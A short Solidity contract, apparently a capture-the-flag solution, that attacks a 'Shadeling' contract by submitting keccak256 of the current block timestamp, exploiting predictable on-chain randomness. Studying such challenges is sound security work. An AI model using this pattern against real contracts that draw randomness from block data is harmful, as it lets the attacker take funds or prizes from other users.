// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./Shadeling.sol";

contract ElderAttacker {

    function predict(Shadeling shadeling) external {
        shadeling.predict(
            keccak256(abi.encode(block.timestamp))
        );
    }

}